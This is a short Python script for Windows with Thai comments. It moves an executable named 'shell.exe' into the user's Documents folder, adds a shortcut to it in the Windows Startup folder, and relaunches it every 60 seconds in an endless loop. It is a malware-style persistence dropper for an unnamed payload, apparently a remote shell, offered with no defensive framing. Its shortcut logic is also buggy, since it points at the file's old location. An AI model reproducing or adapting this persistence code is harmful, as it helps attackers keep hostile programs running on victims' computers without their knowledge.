import os
import shutil
import win32com.client
import time 
import subprocess
def move_file_to_documents(source_path):
    # กำหนดเส้นทางโฟลเดอร์ Documents
    documents_folder = os.path.expanduser("~/Documents")
    # ย้ายไฟล์ไปที่โฟลเดอร์ Documents
    destination_path = os.path.join(documents_folder, os.path.basename(source_path))
    shutil.move(source_path, destination_path)
    print(f"Moved {source_path} to {destination_path}")

def create_shortcut_in_startup(target_path):
    # กำหนดเส้นทางโฟลเดอร์ Startup
    startup_folder = os.path.join(os.path.expanduser("~"), "AppData", "Roaming", "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
    
    # สร้างชื่อไฟล์ Shortcut
    shortcut_name = os.path.splitext(os.path.basename(target_path))[0] + ".lnk"
    shortcut_path = os.path.join(startup_folder, shortcut_name)

    # สร้าง Shortcut
    shell = win32com.client.Dispatch("WScript.Shell")
    shortcut = shell.CreateShortCut(shortcut_path)
    shortcut.TargetPath = target_path
    shortcut.WorkingDirectory = os.path.dirname(target_path)
    shortcut.save()
    
    print(f"Shortcut created at {shortcut_path}")

def main():
    # เส้นทางไฟล์ shell.exe
    source_path = "shell.exe"  # เปลี่ยนให้ตรงกับที่เก็บไฟล์ของคุณ

    # ย้ายไฟล์และสร้าง Shortcut
    move_file_to_documents(source_path)
    create_shortcut_in_startup(source_path)

if __name__ == "__main__":
    main()  # เรียกฟังก์ชันหลักก่อน
    documents_folder = os.path.expanduser("~/Documents")  # ใช้ '/' แทน '\'
    target_path1 = os.path.join(documents_folder, "shell.exe")  # ใช้ os.path.join เพื่อรวมเส้นทาง
    
    print(target_path1)

    while True:
        subprocess.Popen(target_path1)
        print(f"Opened {target_path1}")
        time.sleep(60)


